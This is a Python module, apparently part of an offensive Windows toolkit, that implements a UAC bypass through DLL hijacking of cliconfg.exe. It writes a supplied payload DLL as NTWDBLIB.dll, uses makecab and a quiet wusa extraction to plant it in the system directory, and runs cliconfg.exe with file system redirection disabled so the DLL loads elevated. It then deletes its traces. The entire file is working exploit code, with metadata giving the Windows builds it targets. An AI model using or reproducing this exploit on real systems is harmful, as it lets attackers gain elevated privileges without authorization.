import os
import time
import tempfile
from core.prints import *
from core.utils import *

cliconfg_info = {
        "Description": "Bypass UAC using cliconfg (DLL) and registry key manipulation",
		"Id" : "11",
		"Type" : "UAC bypass",
		"Fixed In" : "9800",	
		"Works From" : "7600",
		"Admin" : False,
		"Function Name" : "cliconfg",
		"Function Payload" : True,
    }

def cliconfg(payload):
	if (payloads().dll(payload) == True):
		try:
			payload_data = open(os.path.join(payload),"rb").read()
		except Exception as error:
			return False

		try:
			dll_file = open(os.path.join(tempfile.gettempdir(),"NTWDBLIB.dll"),"wb")
			dll_file.write(payload_data)
			dll_file.close()
		except Exception as error:
			return False

		time.sleep(5)

		if (os.path.isfile(os.path.join(tempfile.gettempdir(),"NTWDBLIB.dll")) == True):
			if process().create("cmd.exe /c makecab {} {}".format(os.path.join(tempfile.gettempdir(),"NTWDBLIB.dll"),os.path.join(tempfile.gettempdir(),"suspicious.cab")),0) == True:
				print_success("Successfully created cabinet file")
			else:
				print_success("Unable to create cabinet file")
				return False
		else:
			print_error("Unable to create cabinet file, dll file is not found")
			return False	
		
		time.sleep(5)

		if (os.path.isfile(os.path.join(tempfile.gettempdir(),"suspicious.cab")) == True):
			if process().create("cmd.exe /c wusa {} /extract:{} /quiet".format(os.path.join(tempfile.gettempdir(),"suspicious.cab"),information().system_directory()),0) == True:
				print_success("Successfully extracted cabinet file")
			else:
				print_error("Unable to extract cabinet file")	
				return False
		else:
			print_error("Unable to extract cabinet file, cabinet file is not found")
			return False
			
		time.sleep(5)

		print_info("Disabling file system redirection")
		with disable_fsr():
			print_success("Successfully disabled file system redirection")
			if process().create("cmd.exe /c {}\cliconfg.exe".format(information().system_directory()),0) == True:
				print_success("Successfully executed cliconfg executable")
				if (os.path.isfile(os.path.join(tempfile.gettempdir(),"suspicious.cab")) == True):
					try:
						os.remove(os.path.join(tempfile.gettempdir(),"suspicious.cab"))				
					except Exception as error:
						return False
				else:
					pass
				if (os.path.isfile(os.path.join(tempfile.gettempdir(),"NTWDBLIB.dll")) == True):
					try:
						os.remove(os.path.join(tempfile.gettempdir(),"NTWDBLIB.dll"))
					except Exception as error:
						return False
				else:
					pass	
			else:
				print_error("Unable to execute cliconfg executable")
				return False
	else:
		print_error("Cannot proceed, invalid payload")
		return False				
